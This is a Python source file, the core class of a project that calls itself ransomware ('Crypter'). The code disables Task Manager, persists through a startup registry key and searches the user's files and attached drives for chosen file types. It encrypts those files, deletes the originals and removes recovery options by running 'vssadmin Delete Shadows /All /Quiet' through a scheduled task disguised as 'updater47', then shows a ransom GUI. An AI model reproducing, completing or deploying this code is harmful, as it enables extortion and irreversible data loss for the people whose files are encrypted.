'''
@summary: Crypter: Ransomware written entirely in python.
@author: Sithis
@version: 3.5
'''

import json
# Import libs
import os
import sys
import time
import winreg

import win32file
import wx

# Import Package Libs
from . import Base
from . import Crypt
from . import Gui
from .ScheduledTask import ScheduledTask
from .TaskManager import TaskManager


###################
## CRYPTER Class ##
###################
class Crypter(Base.Base):
    '''
    @summary: Crypter: Controls interaction between relevant objects
    @author: MLS
    '''

    def __init__(self):
        '''
        @summary: Constructor
        '''
        self.__config = self.__load_config()
        self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "encrypted_files.txt")
        self.encryption_test_file = os.path.join(os.environ['APPDATA'], "enc_test.txt")

        # Init Crypt Lib
        self.Crypt = Crypt.SymmetricCrypto()

        # FIRST RUN
        # Encrypt!
        if not os.path.isfile(self.encrypted_file_list):
            # Time Delay
            if "time_delay" in self.__config:
                time.sleep(int(self.__config["time_delay"]))

            # Disable Task Manager
            if self.__config["disable_task_manager"]:
                self.task_manager = TaskManager()
                try:
                    self.task_manager.disable()
                except WindowsError:
                    pass

            # Add to startup programs
            # TODO Test
            if self.__config["open_gui_on_login"]:
                self.__add_to_startup_programs()

            # Find files and initialise keys
            self.Crypt.init_keys()

            # Create encryption test file
            file_list = [self.encryption_test_file]
            with open(self.encryption_test_file, "w") as test_file:
                test_file.write("Encryption test")

            # File discovery
            file_list += self.find_files()

            # Start encryption
            self.encrypt_files(file_list)

            # If no files were encrypted. cleanup and return
            if self.__no_files_were_encrypted():
                # TODO Test
                print("No files were encrypted")
                self.cleanup()
                return

            # Delete Shadow Copies
            if "delete_shadow_copies" in self.__config:
                self.__delete_shadow_files()

            # Open GUI
            self.start_gui()

        # ALREADY ENCRYPTED - Open GUI
        elif os.path.isfile(self.encrypted_file_list):
            self.start_gui()


    def __load_config(self):
        '''
        @summary: Loads the runtime cfg file
        @return: JSON runtime config
        '''

        try:
            cfg_path = os.path.join(sys._MEIPASS, self.RUNTIME_CONFIG_FILE)
        except AttributeError:
            cfg_path = os.path.join("..\\", "CrypterBuilder", "Resources", "runtime.cfg")

        with open(cfg_path, "r") as runtime_cfg_file:
            config = json.load(runtime_cfg_file)

        return config


    def __delete_shadow_files(self):
        '''
        @summary: Create, run and delete a scheduled task to delete all file shadow copies from disk
        '''

        vs_deleter = ScheduledTask(
            name="updater47",
            command="vssadmin Delete Shadows /All /Quiet"
        )
        vs_deleter.run_now()
        vs_deleter.cleanup()


    def __no_files_were_encrypted(self):
        '''
        @summary: Checks if any files were encrypted
        @return: True if no files were encrypted, otherwise False
        @todo: Test
        '''

        if not os.path.isfile(self.encrypted_file_list):
            return True
        else:
            return False


    def __add_to_startup_programs(self):
        '''
        @summary: Adds Crypter to the list of Windows startup programs
        @todo: Code and test
        @todo: Restore try and except catch
        '''

        try:
            reg = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, self.STARTUP_REGISTRY_LOCATION)
            winreg.SetValueEx(reg, "Crypter", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(reg)
        except WindowsError:
            pass


    def __remove_from_startup_programs(self):
        '''
        @summary: Removes Crypter from the list of startup programs
        @todo: Code and test
        '''

        try:
            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.STARTUP_REGISTRY_LOCATION, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(reg, "Crypter")
            winreg.CloseKey(reg)
        except WindowsError:
            pass


    def get_start_time(self):
        '''
        @summary: Get's Crypter's start time from the registry, or creates it if it
        doesn't exist
        @return: The time that the ransomware began it's encryption operation, in integer epoch form
        '''

        # Try to open registry key
        try:
            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
            start_time = winreg.QueryValueEx(reg, "")[0]
            winreg.CloseKey(reg)
        # If failure, create the key
        except WindowsError:
            start_time = int(time.time())
            reg = winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
            winreg.SetValue(reg, "", winreg.REG_SZ, str(start_time))
            winreg.CloseKey(reg)

        return start_time


    def cleanup(self):
        '''
        @summary: Cleanups the system following successful decryption. Removed the list of
        encrypted files and deletes the Crypter registry key. Re-enable TM
        '''

        # If files were encrypted, Remove from startup programs (if present in list)
        if not self.__no_files_were_encrypted() and self.__config["open_gui_on_login"]:
            self.__remove_from_startup_programs()

        self.delete_encrypted_file_list()
        self.delete_encrypted_file_test()
        self.delete_registry_entries()

        if self.__config["disable_task_manager"]:
            try:
                self.task_manager.enable()
            except WindowsError:
                pass


    def delete_registry_entries(self):
        '''
        @summary: Deletes the timer registry key
        '''

        # Open and delete the key
        try:
            reg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
            winreg.DeleteKeyEx(reg, "")
            winreg.CloseKey(reg)
        except WindowsError:
            # Ignore any Windows errors
            pass


    def start_gui(self):
        '''
        @summary: Initialises and launches the ransomware GUI screen
        '''

        # Get Crypter start_time
        start_time = self.get_start_time()

        app = wx.App()
        # TODO Update this to new path and place in __init__
        try:
            image_path = sys._MEIPASS
        except AttributeError:
            image_path = os.path.join("..\\", "CrypterBuilder", "Resources")

        crypter_gui = Gui.Gui(
            image_path=image_path,
            start_time=start_time,
            decrypter=self,
            config=self.__config)

        crypter_gui.Show()
        app.MainLoop()


    def get_encrypted_files_list(self):
        '''
        @summary: Returns a list of the files encrypted by crypter
        @return: Encrypted file list
        '''

        # Get list of encrypted files
        try:
            with open(self.encrypted_file_list) as fh:
                file_list = fh.readlines()
            fh.close()
        except IOError:
            # Don't error, just return message
            raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)

        return file_list


    def decrypt_file(self, encrypted_file, decryption_key):
        '''
        @summary: Processes the list of encrypted files and decrypts each. Should be called once per file
        @param encrypted_file: an encrypted file to decrypt
        '''

        # Decrypt!
        if not encrypted_file:
            return

        # IF successful decryption, delete locked file
        locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip(), decryption_key,
                                              self.__config["encrypted_file_extension"])
        if locked_path:
            os.remove(locked_path)


    def delete_encrypted_file_test(self):
        """
        Deletes the encrypted test file
        """
        if os.path.isfile(self.encryption_test_file):
            os.remove(self.encryption_test_file)


    def delete_encrypted_file_list(self):
        '''
        @summary: Deletes the list of encrypted files
        '''
        if os.path.isfile(self.encrypted_file_list):
            os.remove(self.encrypted_file_list)


    def encrypt_files(self, file_list):
        '''
        @summary: Encrypts all files in the provided file list param
        @param file_list: A list of files to encrypt
        '''
        encrypted_files = []

        # Encrypt them and add to list if successful
        for file in file_list:

            # Encrypt file if less than specified file size
            try:
                if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
                    is_encrypted = self.Crypt.encrypt_file(file, self.__config["encrypted_file_extension"])
                else:
                    is_encrypted = False

                # IF encrypted, try to delete the file and add to the list
                if is_encrypted:
                    os.remove(file)
                    encrypted_files.append(file)
            except:
                # Ignore any exception, such as access denied, and continue
                pass

        # Write out list of encrypted files
        if encrypted_files or (not self.__config["encrypt_user_home"] and not self.__config["encrypt_attached_drives"]):
            fh = open(self.encrypted_file_list, "w")
            for encrypted_file in encrypted_files:
                fh.write(encrypted_file)
                fh.write("\n")
            fh.close()


    def find_files(self):
        '''
        @summary: Searches the file system and builds a list of files to encrypt
        @return: List of files matching the location and filetype criteria
        '''
        binary_name = os.path.split(sys.argv[0])[1]

        # Get Current Working Directory
        try:
            cwd = sys._MEIPASS
        except AttributeError:
            cwd = os.path.dirname(os.getcwd())

        base_dirs = self.get_base_dirs(os.environ['USERPROFILE'], self.__config)
        file_list = []

        for directory in base_dirs:
            print("Checking: %s" % directory)
            for path, subdirs, files in os.walk(directory):
                for file in files:
                    if os.path.isfile(os.path.join(path, file)):
                        # Check file is valid
                        try:
                            if (
                                    (self.is_valid_filetype(file)) and
                                    (not self.is_excluded_file(file)) and
                                    (not self.is_excluded_dir(path)) and
                                    (file.lower() != binary_name.lower()) and
                                    (not os.path.join(path, file).lower().startswith(
                                        win32file.GetLongPathName(cwd).lower()))
                            ):
                                file_list.append(os.path.join(path, file))
                        except Exception:
                            # Skip any files with strange chars not within our encoding
                            pass
                for file in subdirs:
                    if os.path.isfile(os.path.join(path, file)):
                        # Check file is valid
                        try:
                            if (
                                    (self.is_valid_filetype(file)) and
                                    (not self.is_excluded_file(file)) and
                                    (not self.is_excluded_dir(path)) and
                                    (file.lower() != binary_name.lower()) and
                                    (not os.path.join(path, file).lower().startswith(
                                        win32file.GetLongPathName(cwd).lower()))
                            ):
                                file_list.append(os.path.join(path, file))
                        except Exception:
                            # Skip any files with strange chars not within our encoding
                            pass

        return file_list


    def is_excluded_dir(self, path):
        '''
        @summary: Checks whether the specified path should be excluded from encryption
        @param path: The path to check
        @return: True if the path should be excluded from encryption, otherwise False
        '''

        for dir_to_exclude in self.DIRS_TO_EXCLUDE:
            if "\\%s" % dir_to_exclude.lower() in path.lower():
                return True

        return False


    def is_excluded_file(self, file):
        '''
        @summary: Checks whether the specified file is marked as a file to be excluded from encryption
        @param file: The file to check
        @requires: True if the file should be excluded from encryption, otherwise false
        '''

        if file.lower() in self.FILES_TO_EXCLUDE:
            return True
        else:
            return False


    def is_valid_filetype(self, file):
        '''
        @summary: Verifies whether the specified file is of an acceptable type for encryption
        @param file: The file to check
        @attention: The list of filetypes to encrypt is defined in the Base.Base class
        '''

        # Split filename
        filename_components = file.split(".")

        # If no extension, return False
        if len(filename_components) <= 1:
            return False
        # Otherwise stringify extension
        else:
            full_extension = ".".join(filename_components[1:]).lower()

        # Check if extension is in the list of encryptable extensions
        for target_extension in self.__config["filetypes_to_encrypt"]:
            if len(target_extension) <= len(full_extension) and full_extension[
                                                                -len(target_extension):] == target_extension.lower():
                return True

        return False


    def set_wallpaper(self):
        '''
        @summary: Sets the users wallpaper to a specific ransom not image
        @deprecated: This method, and approach, is no longer used. The ransom
        note is now displayed via a WX GUI
        @requires: To enable this method, add an import for ctypes
        '''

        # Import image and write to path
        # todo adjust file name... maybe replace this with whatever is provided in the config file?
        image_path = os.path.join(sys._MEIPASS, "ransom.png")

        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path, 3)
